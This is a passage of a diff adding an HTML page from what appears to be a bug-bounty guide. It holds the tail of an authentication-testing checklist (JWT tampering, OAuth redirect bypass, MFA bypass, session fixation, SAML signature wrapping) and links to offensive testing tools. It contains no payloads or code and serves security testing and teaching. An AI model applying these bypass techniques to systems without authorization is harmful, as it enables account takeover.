+</span><span id="__span-49-21"><a id="__codelineno-49-21" name="__codelineno-49-21" href="#__codelineno-49-21"></a>□ Claim tampering without valid signature
+</span><span id="__span-49-22"><a id="__codelineno-49-22" name="__codelineno-49-22" href="#__codelineno-49-22"></a>
+</span><span id="__span-49-23"><a id="__codelineno-49-23" name="__codelineno-49-23" href="#__codelineno-49-23"></a>OAUTH
+</span><span id="__span-49-24"><a id="__codelineno-49-24" name="__codelineno-49-24" href="#__codelineno-49-24"></a>□ redirect_uri: all bypass patterns from 2.4.1
+</span><span id="__span-49-25"><a id="__codelineno-49-25" name="__codelineno-49-25" href="#__codelineno-49-25"></a>□ state present, validated, not reusable
+</span><span id="__span-49-26"><a id="__codelineno-49-26" name="__codelineno-49-26" href="#__codelineno-49-26"></a>□ Auth code in Referer to third parties
+</span><span id="__span-49-27"><a id="__codelineno-49-27" name="__codelineno-49-27" href="#__codelineno-49-27"></a>□ Auth code single-use
+</span><span id="__span-49-28"><a id="__codelineno-49-28" name="__codelineno-49-28" href="#__codelineno-49-28"></a>□ Pre-register with victim email before OAuth
+</span><span id="__span-49-29"><a id="__codelineno-49-29" name="__codelineno-49-29" href="#__codelineno-49-29"></a>□ Account linking logic tested both directions
+</span><span id="__span-49-30"><a id="__codelineno-49-30" name="__codelineno-49-30" href="#__codelineno-49-30"></a>
+</span><span id="__span-49-31"><a id="__codelineno-49-31" name="__codelineno-49-31" href="#__codelineno-49-31"></a>MFA
+</span><span id="__span-49-32"><a id="__codelineno-49-32" name="__codelineno-49-32" href="#__codelineno-49-32"></a>□ OTP rate limiting (10 attempts → lockout?)
+</span><span id="__span-49-33"><a id="__codelineno-49-33" name="__codelineno-49-33" href="#__codelineno-49-33"></a>□ Response manipulation on MFA step
+</span><span id="__span-49-34"><a id="__codelineno-49-34" name="__codelineno-49-34" href="#__codelineno-49-34"></a>□ Direct navigation past MFA after password auth
+</span><span id="__span-49-35"><a id="__codelineno-49-35" name="__codelineno-49-35" href="#__codelineno-49-35"></a>□ API endpoints accessible with partial-auth session
+</span><span id="__span-49-36"><a id="__codelineno-49-36" name="__codelineno-49-36" href="#__codelineno-49-36"></a>□ Backup code reuse and rate limiting
+</span><span id="__span-49-37"><a id="__codelineno-49-37" name="__codelineno-49-37" href="#__codelineno-49-37"></a>□ Recovery/reset flow that skips MFA
+</span><span id="__span-49-38"><a id="__codelineno-49-38" name="__codelineno-49-38" href="#__codelineno-49-38"></a>
+</span><span id="__span-49-39"><a id="__codelineno-49-39" name="__codelineno-49-39" href="#__codelineno-49-39"></a>SESSION
+</span><span id="__span-49-40"><a id="__codelineno-49-40" name="__codelineno-49-40" href="#__codelineno-49-40"></a>□ Token unchanged after login (fixation)
+</span><span id="__span-49-41"><a id="__codelineno-49-41" name="__codelineno-49-41" href="#__codelineno-49-41"></a>□ Session valid after logout
+</span><span id="__span-49-42"><a id="__codelineno-49-42" name="__codelineno-49-42" href="#__codelineno-49-42"></a>□ Session valid after password/email change
+</span><span id="__span-49-43"><a id="__codelineno-49-43" name="__codelineno-49-43" href="#__codelineno-49-43"></a>□ Cookie flags: Secure, HttpOnly, SameSite
+</span><span id="__span-49-44"><a id="__codelineno-49-44" name="__codelineno-49-44" href="#__codelineno-49-44"></a>□ Token entropy via Burp Sequencer
+</span><span id="__span-49-45"><a id="__codelineno-49-45" name="__codelineno-49-45" href="#__codelineno-49-45"></a>
+</span><span id="__span-49-46"><a id="__codelineno-49-46" name="__codelineno-49-46" href="#__codelineno-49-46"></a>SSO / SAML
+</span><span id="__span-49-47"><a id="__codelineno-49-47" name="__codelineno-49-47" href="#__codelineno-49-47"></a>□ All 8 XSW variants via SAML Raider
+</span><span id="__span-49-48"><a id="__codelineno-49-48" name="__codelineno-49-48" href="#__codelineno-49-48"></a>□ Signature removed entirely → still accepted?
+</span><span id="__span-49-49"><a id="__codelineno-49-49" name="__codelineno-49-49" href="#__codelineno-49-49"></a>□ Response replayed in new session
+</span><span id="__span-49-50"><a id="__codelineno-49-50" name="__codelineno-49-50" href="#__codelineno-49-50"></a>□ NameID modified without signature
+</span><span id="__span-49-51"><a id="__codelineno-49-51" name="__codelineno-49-51" href="#__codelineno-49-51"></a>□ Audience bypass across services
+</span><span id="__span-49-52"><a id="__codelineno-49-52" name="__codelineno-49-52" href="#__codelineno-49-52"></a>□ NotBefore/NotOnOrAfter enforcement
+</span></code></pre></div>
+</details>
+<hr />
+<h2 id="references">References<a class="headerlink" href="#references" title="Permanent link">&para;</a></h2>
+<div class="grid cards">
+<ul>
+<li>
+<p><span class="twemoji"><svg xmlns="http://www.w3.org/2000/svg" viewBox="0 0 24 24"><path d="M0 0v24h10.718v-3.805l3.496-4.272h-3.496v-5.205H4.427l6.291-7.767V0Zm13.282 0v3.884L9.786 8.155h3.496v5.205h6.291l-6.291 7.767V24H24V0Z"/></svg></span> <strong>PortSwigger Labs</strong></p>
+<hr />
+<ul>
+<li><a href="https://portswigger.net/web-security/authentication">Authentication</a></li>
+<li><a href="https://portswigger.net/web-security/oauth">OAuth</a></li>
+<li><a href="https://portswigger.net/web-security/jwt">JWT (all 8 labs)</a></li>
+<li><a href="https://portswigger.net/web-security/host-header">Host header attacks</a></li>
+</ul>
+</li>
+<li>
+<p><span class="twemoji"><svg xmlns="http://www.w3.org/2000/svg" viewBox="0 0 16 16"><path d="M5.433 2.304A4.49 4.49 0 0 0 3.5 6c0 1.598.832 3.002 2.09 3.802.518.328.929.923.902 1.64v.008l-.164 3.337a.75.75 0 1 1-1.498-.073l.163-3.33c.002-.085-.05-.216-.207-.316A6 6 0 0 1 2 6a6 6 0 0 1 2.567-4.92 1.48 1.48 0 0 1 1.673-.04c.462.296.76.827.76 1.423v2.82c0 .082.041.16.11.206l.75.51a.25.25 0 0 0 .28 0l.75-.51A.25.25 0 0 0 9 5.282V2.463c0-.596.298-1.127.76-1.423a1.48 1.48 0 0 1 1.673.04A6 6 0 0 1 14 6a6 6 0 0 1-2.786 5.068c-.157.1-.209.23-.207.315l.163 3.33a.752.752 0 0 1-1.094.714.75.75 0 0 1-.404-.64l-.164-3.345c-.027-.717.384-1.312.902-1.64A4.5 4.5 0 0 0 12.5 6a4.49 4.49 0 0 0-1.933-3.696c-.024.017-.067.067-.067.16v2.818a1.75 1.75 0 0 1-.767 1.448l-.75.51a1.75 1.75 0 0 1-1.966 0l-.75-.51A1.75 1.75 0 0 1 5.5 5.282V2.463c0-.092-.043-.142-.067-.159"/></svg></span> <strong>Tools</strong></p>
+<hr />
+<ul>
+<li><a href="https://github.com/ticarpi/jwt_tool">jwt_tool</a></li>
+<li><a href="https://portswigger.net/bappstore/c61cfa893bb14db4b01775554f7b802e">SAML Raider (BApp)</a></li>
+<li><a href="https://portswigger.net/bappstore/26aaa5ded2f74beea19e2ed8345a93dd">Burp JWT Editor (BApp)</a></li>
+<li><a href="https://github.com/projectdiscovery/interactsh">interactsh</a></li>
+</ul>
+</li>
+<li>
+<p><span class="twemoji"><svg xmlns="http://www.w3.org/2000/svg" viewBox="0 0 16 16"><path d="M0 1.75A.75.75 0 0 1 .75 1h4.253c1.227 0 2.317.59 3 1.501A3.74 3.74 0 0 1 11.006 1h4.245a.75.75 0 0 1 .75.75v10.5a.75.75 0 0 1-.75.75h-4.507a2.25 2.25 0 0 0-1.591.659l-.622.621a.75.75 0 0 1-1.06 0l-.622-.621A2.25 2.25 0 0 0 5.258 13H.75a.75.75 0 0 1-.75-.75Zm7.251 10.324.004-5.073-.002-2.253A2.25 2.25 0 0 0 5.003 2.5H1.5v9h3.757a3.75 3.75 0 0 1 1.994.574M8.755 4.75l-.004 7.322a3.75 3.75 0 0 1 1.992-.572H14.5v-9h-3.495a2.25 2.25 0 0 0-2.25 2.25"/></svg></span> <strong>References</strong></p>
+<hr />
+<ul>
+<li><a href="https://github.com/ticarpi/jwt_tool/wiki">jwt_tool wiki</a></li>
+<li><a href="https://cheatsheetseries.owasp.org/cheatsheets/JSON_Web_Token_for_Java_Cheat_Sheet.html">OWASP JWT cheatsheet</a></li>
+<li><a href="https://cheatsheetseries.owasp.org/cheatsheets/SAML_Security_Cheat_Sheet.html">OWASP SAML cheatsheet</a></li>
+<li><a href="https://github.com/swisskyrepo/PayloadsAllTheThings/tree/master/Authentication%20Bypass">PayloadsAllTheThings — Auth bypass</a></li>
+</ul>
+</li>
+</ul>
+</div>
+
+
+  <nav class="md-tags" >
+    
+      
+      
+      
+      
+        <span class="md-tag">authentication</span>
+      
+    
+      
+      
+      
+      
+        <span class="md-tag">session</span>
+      
+    
+      
+      
+      
+      
+        <span class="md-tag">jwt</span>
+      
+    
+      
+      
+      
+      
+        <span class="md-tag">oauth</span>
+      
+    
+      
+      
+      
+      
+        <span class="md-tag">bug-bounty</span>
+      
+    
+  </nav>
+
+
+
+
+
+
+
+
+  
+  
+
+
+
+
+
+
+                
+              </article>
+            </div>
+          
+          
+  <script>var tabs=__md_get("__tabs");if(Array.isArray(tabs))e:for(var set of document.querySelectorAll(".tabbed-set")){var labels=set.querySelector(".tabbed-labels");for(var tab of tabs)for(var label of labels.getElementsByTagName("label"))if(label.innerText.trim()===tab){var input=document.getElementById(label.htmlFor);input.checked=!0;continue e}}</script>
+
+<script>var target=document.getElementById(location.hash.slice(1));target&&target.name&&(target.checked=target.name.startsWith("__tabbed_"))</script>
+        </div>
+        
+          <button type="button" class="md-top md-icon" data-md-component="top" hidden>
+  
+  <svg xmlns="http://www.w3.org/2000/svg" fill="none" stroke="currentColor" stroke-linecap="round" stroke-linejoin="round" stroke-width="2" class="lucide lucide-circle-arrow-up" viewBox="0 0 24 24"><circle cx="12" cy="12" r="10"/><path d="m16 12-4-4-4 4M12 16V8"/></svg>
+  Back to top
+</button>
+        
+      </main>
+      
+        <footer class="md-footer">
+  
+    
+      
+      <nav class="md-footer__inner md-grid" aria-label="Footer" >
+        
+          
+          <a href="../part-01-recon/" class="md-footer__link md-footer__link--prev" aria-label="Previous: Reconnaissance">
+            <div class="md-footer__button md-icon">
+              
+              <svg xmlns="http://www.w3.org/2000/svg" fill="none" stroke="currentColor" stroke-linecap="round" stroke-linejoin="round" stroke-width="2" class="lucide lucide-arrow-left" viewBox="0 0 24 24"><path d="m12 19-7-7 7-7M19 12H5"/></svg>
+            </div>
+            <div class="md-footer__title">
+              <span class="md-footer__direction">
+                Previous
+              </span>
+              <div class="md-ellipsis">
+                Reconnaissance
+              </div>
+            </div>
+          </a>
+        
+        
+          
+          <a href="../part-03-access-control/" class="md-footer__link md-footer__link--next" aria-label="Next: Access Control">
+            <div class="md-footer__title">
+              <span class="md-footer__direction">
+                Next
+              </span>
+              <div class="md-ellipsis">
+                Access Control
+              </div>
+            </div>
+            <div class="md-footer__button md-icon">
+              
+              <svg xmlns="http://www.w3.org/2000/svg" fill="none" stroke="currentColor" stroke-linecap="round" stroke-linejoin="round" stroke-width="2" class="lucide lucide-arrow-right" viewBox="0 0 24 24"><path d="M5 12h14M12 5l7 7-7 7"/></svg>
+            </div>
+          </a>
+        
+      </nav>
+    
+  
+  <div class="md-footer-meta md-typeset">
+    <div class="md-footer-meta__inner md-grid">
+      <div class="md-copyright">
+  
+    <div class="md-copyright__highlight">
+      Copyright &copy; 2026 Wellington Vumu
+
+    </div>
+  
+  
+    Made with
+    <a href="https://zensical.org/" target="_blank" rel="noopener">
+      Zensical
+    </a>
+  
+</div>
+      
+    </div>
+  </div>
+</footer>
+      
+    </div>
+    <div class="md-dialog" data-md-component="dialog">
+      <div class="md-dialog__inner md-typeset"></div>
+    </div>
+    
+    
+    
+      
+      
+      <script id="__config" type="application/json">{"annotate":null,"base":"..","features":["announce.dismiss","content.code.annotate","content.code.copy","content.code.select","content.footnote.tooltips","content.tabs.link","content.tooltips","navigation.footer","navigation.instant","navigation.instant.prefetch","navigation.path","navigation.sections","navigation.top","navigation.tracking","search.highlight"],"search":"../assets/javascripts/workers/search.e2d2d235.min.js","tags":null,"translations":{"clipboard.copied":"Copied to clipboard","clipboard.copy":"Copy to clipboard","search.result.more.one":"1 more on this page","search.result.more.other":"# more on this page","search.result.none":"No matching documents","search.result.one":"1 matching document","search.result.other":"# matching documents","search.result.placeholder":"Type to start searching","search.result.term.missing":"Missing","select.version":"Select version"},"version":null}</script>
+    
+    
+      <script src="../assets/javascripts/bundle.dbc0afdc.min.js"></script>
+      
+    
+  </body>
+</html>
